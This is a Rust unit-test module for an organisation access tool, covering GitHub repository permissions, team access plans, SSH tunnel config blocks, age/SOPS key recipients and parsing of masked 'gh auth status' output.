        let mut people = org_access(ORG).people;
        repo_grants(&mut people, r#"{"data":{"organization":{"repositories":{"nodes":[{"name":"exo-l3","viewerPermission":"READ"}]}}}}"#, "alice");
        assert_eq!(people["alice"].grants.as_ref().unwrap()["exo-l3"], 1);
    }

    #[test]
    fn machines_need_write_on_the_code_repo() {
        let rules = r#"{"machines": {"hosts": [{"host": "host-20", "repos": {"NTKCAP": "ntkcap", "ExoPulse": "exopulse"}, "ready": true},
            {"host": "hpc", "repos": {"depRL": ""}, "via": "host-20", "personal": true, "power": "sometimes", "note": "n"}],
            "teams": {"NTKCAP": ["l1"], "ExoPulse": ["l2", "l5"]}}}"#;
        let ms = machines(rules);
        assert_eq!(ms.len(), 3);
        let teams = |repo: &str| ms.iter().find(|m| m.repo == repo).unwrap().teams.clone();
        assert_eq!((teams("NTKCAP"), teams("ExoPulse"), teams("depRL")), (vec!["l1".into()], vec!["l2".into(), "l5".into()], vec![]));
        assert!(ms[2].personal && ms[2].sometimes && ms[2].via.as_deref() == Some("host-20") && ms[2].note == "n");
        let g = BTreeMap::from([("NTKCAP".to_string(), 2u8), ("ExoPulse".to_string(), 1)]);
        let ok: Vec<_> = ms[..2].iter().filter(|m| can_sign_in(m, Some(&g))).map(|m| m.account.as_str()).collect();
        assert_eq!(ok, ["ntkcap"]);
        assert!(ms.iter().all(|m| can_sign_in(m, None)));
        assert!(machines("{}").is_empty());
    }

    #[test]
    fn ssh_block_replaces_only_its_own_lines() {
        let rules = r#"{"machines": {"hosts": [{"host": "host-20", "repos": {"NTKCAP": "ntkcap", "ExoPulse": "exopulse"}, "tunnel": "ssh-host-20.example.com"},
            {"host": "kd240", "repos": {"firmware_layer": "firmware"}}]}}"#;
        let signed = ssh_block(&machines(&rules.replace(r#""tunnel": "ssh-host-20"#, r#""cert": true, "tunnel": "ssh-host-20"#)), "/opt/a app/aiwalk-setup");
        assert!(signed.contains(r#"Match originalhost host-20 exec "'/opt/a app/aiwalk-setup' --ssh-cert ssh-host-20.example.com --quiet""#)
            && signed.contains("CertificateFile ~/.cloudflared/ssh-host-20.example.com-cf_key-cert.pub") && !signed.contains("Host host-20"), "{signed}");
        let block = ssh_block(&machines(rules), "/opt/aiwalk-setup");
        assert_eq!(block.matches("Host ").count(), 1, "one alias per tunnelled machine: {block}");
        assert!(block.contains("HostName ssh-host-20.example.com") && block.contains("\"/opt/aiwalk-setup\" --ssh-proxy %h"));
        let mine = "Host nuctz-70\n    HostName 10.0.0.70\n";
        let once = with_ssh_block(mine, &block);
        assert!(once.starts_with(mine) && once.ends_with(&block));
        let again = with_ssh_block(&once, &ssh_block(&[], "/x"));
        assert!(again.starts_with(mine) && !again.contains("host-20") && again.matches(">>> aIwalk").count() == 1);
    }

    #[test]
    fn machines_are_added_renamed_and_removed_line_by_line() {
        let text = "{\n  \"version\": 1,\n  \"machines\": {\n    \"hosts\": [\n      { \"host\": \"dragon\", \"repos\": { \"NTKCAP\": \"ntkcap\" }, \"ready\": false, \"tunnel\": \"ssh-dragon.x.com\" },\n      { \"host\": \"horse\", \"repos\": { \"depRL\": \"deprl\" }, \"ready\": false }\n    ]\n  },\n  \"skills\": []\n}\n";
        let repos = BTreeMap::from([("ExoPulse".to_string(), "exopulse".to_string())]);
        let line = machine_line("dog", &repos, "Spare box", "ssh-dog.x.com");
        assert_eq!(line, r#"{ "host": "dog", "note": "Spare box", "ready": false, "repos": { "ExoPulse": "exopulse" }, "tunnel": "ssh-dog.x.com" }"#);
        let added = edit_machines(text, &|_, _| None, Some(&line)).unwrap();
        assert!(added.contains("\"ready\": false },\n      { \"host\": \"dog\"") && added.ends_with("\"skills\": []\n}\n"));
        assert_eq!(machines(&added).iter().map(|m| m.host.as_str()).collect::<Vec<_>>(), ["dragon", "horse", "dog"]);
        let renamed = edit_machines(&added, &|v, l| (v["host"] == "dog").then(|| Some(l.replace("\"dog\"", "\"pig\"").replace("ssh-dog", "ssh-pig"))), None).unwrap();
        assert!(machines(&renamed).iter().any(|m| m.host == "pig" && m.tunnel.as_deref() == Some("ssh-pig.x.com")));
        let removed = edit_machines(&renamed, &|v, _| (v["host"] == "pig").then_some(None), None).unwrap();
        assert_eq!(removed, text, "removing what was added gives the file back unchanged");
        assert!(edit_machines(text, &|v, _| (v["host"] == "cat").then_some(None), None).is_err());
    }

    #[test]
    fn request_round_trip() {
        assert_eq!(parse_request(&request_body("exo-l3", "write", "for the gait study")), Some(("exo-l3".into(), "write".into())));
        assert_eq!(parse_request("repo: exo-l3\nlevel: admin"), None);
        assert_eq!(parse_request("hello"), None);
    }

    #[test]
    fn only_owners_see_everyone() {
        assert_eq!(visible_to(org_access(ORG).people, "owner").len(), 2);
        let member = visible_to(org_access(ORG).people, "alice");
        assert_eq!(member.keys().collect::<Vec<_>>(), ["alice"]);
        assert!(visible_to(org_access(ORG).people, "stranger").is_empty());
    }

    const K1: &str = "age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p";
    const K2: &str = "age1yubikey1qwt50d05nh5vutpdzmlg5wn80xq5negm4uj9ghv0snvdd3yysf5yw3rhl3t";

    #[test]
    fn age_requests_carry_only_a_valid_public_key() {
        assert_eq!(parse_age_request(&age_request_body(K1)).as_deref(), Some(K1));
        assert_eq!(parse_age_request("age-key: AGE-SECRET-KEY-1QQQ"), None);
        assert_eq!(parse_age_request("age-key: age1short"), None);
    }

    #[test]
    fn recipients_add_replace_and_remove() {
        let t = with_recipient("", "bob", Some(K1));
        let t = with_recipient(&t, "alice", Some(K2));
        assert_eq!(parse_recipients(&t), [("alice".into(), K2.into()), ("bob".into(), K1.into())]);
        let t = with_recipient(&t, "alice", Some(K1));
        assert_eq!(parse_recipients(&t).len(), 2);
        let t = with_recipient(&t, "bob", None);
        assert_eq!(parse_recipients(&t), [("alice".to_string(), K1.to_string())]);
        assert!(sops_config(&parse_recipients(&with_recipient(&t, "bob", Some(K2)))).contains(&format!("{K1},\n      {K2}")));
    }

    #[test]
    fn gh_status_lists_every_account() {
        let out = "github.com\n  ✓ Logged in to github.com account old (keyring)\n  - Active account: false\n  - Token: gho_****\n\
                   \n  ✓ Logged in to github.com account eddLai (keyring)\n  - Active account: true\n  - Git operations protocol: https\n  - Token: github_pat_11****\n";
        let a = parse_gh_status(out);
        assert_eq!(a.iter().map(|a| (a.login.as_str(), a.active)).collect::<Vec<_>>(), [("old", false), ("eddLai", true)]);
        assert_eq!((a[1].method.as_str(), a[1].protocol.as_str(), a[0].method.as_str()), ("temporary", "https", "account"));
        assert!(parse_gh_status("You are not logged into any GitHub hosts.").is_empty());
    }

    #[test]
    fn access_plans_use_the_layer_team_and_name_shared_teams() {
        let t = |slug: &str, repos: &[(&str, u8)], members: &[&str]| Team { slug: slug.into(),
            repos: repos.iter().map(|(r, k)| (r.to_string(), *k)).collect(), members: members.iter().map(|m| m.to_string()).collect() };
        let teams = [t("l3", &[("exo-l3", 2)], &["bob"]), t("members", &[("exo-book", 2), ("exo-papers", 2)], &["bob"]), t("core", &[("exo-l3", 4)], &[])];
        assert_eq!(plan_access(&teams, "amy", "exo-l3", 2), AccessPlan { join: Some("l3".into()), ..Default::default() });
        assert_eq!(plan_access(&teams, "bob", "exo-l3", 1), AccessPlan { leave: vec!["l3".into()], direct: Some("pull"), ..Default::default() });
        assert_eq!(plan_access(&teams, "bob", "exo-l3", 0), AccessPlan { leave: vec!["l3".into()], ..Default::default() });
        assert_eq!(plan_access(&teams, "bob", "exo-book", 1).blocked_by, ["members"]);
        assert_eq!(plan_access(&teams, "amy", "NTKCAP", 2).direct, Some("push"));
    }

    #[test]
    fn merge_needs_maintain_or_admin() {
        let c: Vec<Value> = serde_json::from_str(r#"[{"login":"own","permissions":{"admin":true,"maintain":true,"push":true,"pull":true}},
            {"login":"mai","permissions":{"admin":false,"maintain":true,"push":true,"pull":true}},
            {"login":"wri","permissions":{"admin":false,"maintain":false,"push":true,"pull":true}},
            {"login":"rea","permissions":{"admin":false,"maintain":false,"push":false,"triage":true,"pull":true}}]"#).unwrap();
        assert_eq!(merge_rights(&c), (vec!["own".into(), "mai".into()], vec!["wri".into()]));
    }

    #[test]
fn people_edit_needs_owner_and_admin_org() {
    let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
    assert!(can_edit_people(true, &s(&["repo", "admin:org"])));
    assert!(!can_edit_people(true, &s(&["repo", "read:org"])));
    assert!(!can_edit_people(false, &s(&["admin:org"])));
}

#[test]
    fn tree_groups_by_team() {
        let tree = build_tree(&vault_repos(RULES).unwrap(), &org_access(ORG).repo_teams);
        let groups: Vec<_> = tree.children.iter()
            .map(|g| (g.title.as_str(), g.children.iter().map(|c| c.title.as_str()).collect::<Vec<_>>())).collect();
        assert_eq!(groups, [("Layers", vec!["L3 Simulation AI"]), ("Team shared", vec!["Papers"]),
                            ("Founders", vec!["Mgmt", "Tooling"])]);
    }
}
